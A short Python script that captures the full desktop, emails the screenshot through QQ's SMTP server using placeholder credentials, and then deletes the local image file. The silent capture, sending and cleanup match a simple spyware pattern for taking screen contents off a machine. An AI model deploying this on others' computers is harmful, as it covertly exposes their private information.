import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from PIL import ImageGrab
import time
import os


class sendmail_with_pic:
    def __init__(self):
        self.pic_name = 'desktop.png'

    def send_mail(self):
        pic = ImageGrab.grab()
        pic.save(self.pic_name)
        receiver = "邮箱"
        sender = "邮箱"
        pwd = "密码"
        msg = MIMEMultipart()
        msg["Subject"] = time.asctime(time.localtime(time.time()))
        msg["From"] = sender
        msg["To"] = receiver
        part = MIMEApplication(open(self.pic_name, 'rb').read())
        part.add_header('Content-Disposition', 'attachment', filename=self.pic_name)
        msg.attach(part)
        try:
            s = smtplib.SMTP("smtp.qq.com", timeout=30)
            s.ehlo()
            s.starttls()
            s.login(sender, pwd)
            s.sendmail(sender, receiver, msg.as_string())
            s.close()
            print('yo!')
        except Exception as e:
            print(e)

if __name__ == '__main__':
    mail = sendmail_with_pic()
    mail.send_mail()
    time.sleep(1)
    os.remove(mail.pic_name)
